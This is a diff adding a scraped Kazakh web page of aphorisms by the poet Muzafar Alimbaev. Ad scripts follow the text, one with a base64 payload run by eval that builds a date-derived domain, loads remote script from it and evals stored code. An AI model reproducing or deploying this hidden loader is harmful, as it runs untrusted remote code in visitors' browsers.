@@ -1,0 +1,114 @@
+Бұл күнде халық арасында кең қолданылып жүрген аталы сөздердің авторларын көбіне біле бермейміз.
+Естісек те, есімізде қалмаған болар.
+Әсіресе «Үйлену оңай, үй болу қиын», «Жұмыла көтерген жүк жеңіл» деген күнделікті ауызекі қолданысқа еніп кеткен ой орамдарының иесі ақын Мұзафар Әлімбаев екенін көбіміз білмеуіміз де мүмкін.
+Қазақстанның халық жазушысы, мемлекеттік сыйлықтың лауреаты, публицист, әдебиет зерттеушісі, аудармашы, қазақ әдебиетінде соғыс сұрапылын бастан кешіп келген қаламгердің ой орамдары қашан да мәнін жойған емес.
+Бүгінде халық жадынан орын алып, күнделікті қолданысқа еніп кетті.
+Мақал-мәтел ретінде айтылып жүргендері жетерлік.
+Олай болса ақынның осындай мәнді ой орамдарын назарларыңызға ұсынғанды жөн санап отырмыз..***
+Он күндік істі бір күнге сыйғызу – зорлық,
+Бір күндік істі он күнге созу – қорлық
+*** 
+Мықтының мұңы да – мылқау.
+***
+Шәкіртке ұстаз болу – ірілік, ұстазға ұстаз болу – ұлылық.
+***
+Ескерткіш тозса да, естелік тозбайды.
+***
+Үйлену оңай, үй болу қиын.
+***
+Мақал – сөздің атасы.
+***
+Түйірдей болса да, түйінді ойың болсын.
+***
+Масқарадан ажал да ақтап ала алмайды.
+***
+Жүзіктің өзінен де – көзі қымбат
+Ақынның сыйлығынан – сөзі қымбат.
+***
+Бас иілмесе – тізе бүгілмейді.
+***
+Тозған сөзде – тозаң көп.
+***
+Ұлтын білгің келсе – ғұрпын біл.
+***
+Ерден ердің артықтығы – білігі,
+Елден елдің артықтығы – бірлігі.
+***
+Кішілікке жараған – кісілікке де жарар.
+***
+Шыншыл қалам шымыр жазады.
+***
+Ынтымақ елдікке жеткізер, 
+Елдік ерлікке жеткізер.
+***
+Аздың азаншысы болғанша, көптің қазаншысы бол.
+***
+Жұмыла көтерген жүк жеңіл.
+***
+Ұста сөз – ұстаз!
+***
+Ұстаз ұқтыра алмағанды өмір ұқтырады.
+***
+Өшіргіш өзгені де өшіреді, өзі де өшеді.
+***
+Өтіріктің арбасы шындықтың көпірінен өте алмайды.
+***
+Мақал-мәтел маржан сөз,
+Қоса көрме арзан сөз.
+***
+Ебі жоқ дәрігердің – емі жоқ.
+***
+Жақсының бәрі – жан туыс,
+Жаманның жаны – тар қуыс.
+***
+Жан қимақ бар – жар қимақ жоқ.
+***
+Талант – табиғаттан, талап – өзіңнен.
+***
+«Осыны мен неге жазбадым екен» делінген жыр ұзақ жасайды.
+***
+Әр Төлегеннің – өз Жібегі бар..Жинақтаған: Өмірбек Сансызбай
+«Массагет.kz» сайты.Бөлісіңіз:
+
+
+
+
+
+
+ 
+          var node4990 = document.getElementById("MIXADV_4990");
+          if( node4990 )
+          {
+               var script = document.createElement("script");
+               script.charset = "utf-8";
+               script.src = "https://m.mixadvert.com/show/?id=4990&r="+Math.random();
+               node4990.parentNode.appendChild(script); 
+               script.onerror = function(){
+                  window.eval( atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDQ5OTAgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNDk5MC5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTQ5OTAuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjQ5OTAiKSkgfSwgNTAwMCk7ICA7fTsg") );
+              }
+          }
+          
+
+
+
+
+    (function(w, d, n, s, t) {
+        w[n] = w[n] || [];
+        w[n].push(function() {
+            Ya.Context.AdvManager.render({
+                blockId: "R-A-241735-5",
+                renderTo: "yandex_rtb_R-A-241735-5",
+                async: true
+            });
+        });
+        t = d.getElementsByTagName("script")[0];
+        s = d.createElement("script");
+        s.type = "text/javascript";
+        s.src = "//an.yandex.ru/system/context.js";
+        s.async = true;
+        t.parentNode.insertBefore(s, t);
+    })(this, this.document, "yandexContextAsyncCallbacks");
+
+
+
+.
